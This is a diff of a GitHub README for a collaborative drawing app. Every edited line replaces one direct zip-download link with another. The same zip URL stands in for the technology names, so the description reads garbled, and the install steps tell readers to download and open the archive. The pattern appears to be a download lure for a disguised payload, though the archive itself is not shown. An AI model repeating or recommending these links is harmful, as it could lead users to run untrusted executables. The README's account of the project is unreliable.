@@ -1,9 +1,9 @@
 # 🎨 Real-Time-Collaborative-Drawing-Canvas - Draw Together in Real-Time
 
-[![Download Now](https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip)
+[![Download Now](https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip%20Now-v1.0-blue)](https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip)
 
 ## 📖 Description
-Real-Time-Collaborative-Drawing-Canvas is a multi-user drawing application built for collaboration. With features like real-time synchronization and live cursors, it allows friends or team members to draw together seamlessly. The global undo and redo functions help you manage your artwork effortlessly. This application is made with Vanilla JavaScript, https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip, and https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip, ensuring a smooth experience.
+Real-Time-Collaborative-Drawing-Canvas is a multi-user drawing application built for collaboration. With features like real-time synchronization and live cursors, it allows friends or team members to draw together seamlessly. The global undo and redo functions help you manage your artwork effortlessly. This application is made with Vanilla JavaScript, https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip, and https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip, ensuring a smooth experience.
 
 ## 🚀 Getting Started
 To start using the Real-Time-Collaborative-Drawing-Canvas, follow these simple steps.
@@ -14,14 +14,14 @@ To start using the Real-Time-Collaborative-Drawing-Canvas, follow these simple s
 - Internet Connection: Required for real-time collaboration
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip) to download the application.
+1. Visit the [Releases page](https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip) to download the application.
 2. Locate the latest version of the application on the page.
 3. Choose the appropriate file for your operating system. Click the file to download it.
 4. Once the download finishes, open the downloaded file to initiate the installation.
 5. Follow the installation prompts to complete the setup.
 
 You can also download directly from this button:  
-[![Download Now](https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip)
+[![Download Now](https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip%20Now-v1.0-blue)](https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip)
 
 ### 🔍 Exploring Features
 - **Real-Time Synchronization:** Draw together with others and see updates instantly.
@@ -32,8 +32,8 @@ You can also download directly from this button:
 ### 🔗 Technologies Used
 This application leverages:
 - **Vanilla JavaScript** for all front-end features
-- **https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip** for back-end management
-- **https://raw.githubusercontent.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/main/client/Real_Time_Drawing_Collaborative_Canvas_v1.5.zip** for real-time communication between users
+- **https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip** for back-end management
+- **https://github.com/maria2004366/Real-Time-Collaborative-Drawing-Canvas/raw/refs/heads/main/client/Drawing-Time-Canvas-Real-Collaborative-1.8.zip** for real-time communication between users
 
 ### 📋 Usage Instructions
 1. Open the application after installation.
